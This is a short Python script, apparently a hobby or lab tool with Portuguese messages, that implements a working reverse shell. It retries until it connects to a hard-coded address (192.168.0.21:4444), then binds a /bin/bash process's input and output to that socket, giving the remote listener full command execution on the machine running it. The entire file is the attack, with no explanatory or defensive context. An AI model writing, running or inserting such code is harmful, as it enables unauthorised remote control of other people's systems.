import subprocess
import socket
import os


def established_connection(host, port):
    while True:
        try:
            client = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM,
            )
            client.connect((host, port))
        except Exception as erro:
            continue
        else:
            return client


def reverse_shell(client):
    SOCK = client.fileno()
    shell = subprocess.Popen(
            ["/bin/bash"],
            stdin=SOCK,
            stdout=SOCK,
            stderr=SOCK,
            )
    while shell.poll() is None:
        continue
    else:
        print("[-]Processo morto")
        client.close()


def main(host, port):
    client = established_connection(host, port)
    reverse_shell(client)


if __name__ == "__main__":
    main("192.168.0.21", 4444)